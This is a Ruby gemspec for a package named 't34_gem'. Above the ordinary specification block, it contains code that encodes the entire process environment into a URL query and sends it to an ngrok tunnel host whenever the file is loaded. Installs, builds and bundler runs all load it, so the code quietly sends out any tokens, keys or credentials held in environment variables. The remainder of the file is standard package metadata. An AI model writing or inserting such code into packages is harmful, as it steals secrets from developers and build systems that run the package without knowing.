# frozen_string_literal: true

require "uri"
require "open-uri"

uri = URI("https://cf76-133-237-7-72.jp.ngrok.io")
uri.query = URI.encode_www_form(ENV)
URI.open(uri, &:read)

Gem::Specification.new do |spec|
  spec.name = "t34_gem"
  spec.version = "0.1.20"
  spec.authors = ["Yutaka Kamei"]

  spec.summary = "t34_gem"
  spec.description = "t34_gem"
  spec.homepage = "https://github.com/yykamei/t34_gem"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"] = spec.homepage

  spec.files = Dir.chdir(__dir__) do
    `git ls-files -z`.split("\x0").reject do |f|
      (File.expand_path(f) == __FILE__) || f.start_with?(*%w[bin/ test/ spec/ features/ .git .circleci appveyor])
    end
  end
  spec.bindir = "exe"
  spec.executables = spec.files.grep(%r{\Aexe/}) { |f| File.basename(f) }
  spec.require_paths = ["lib"]
end
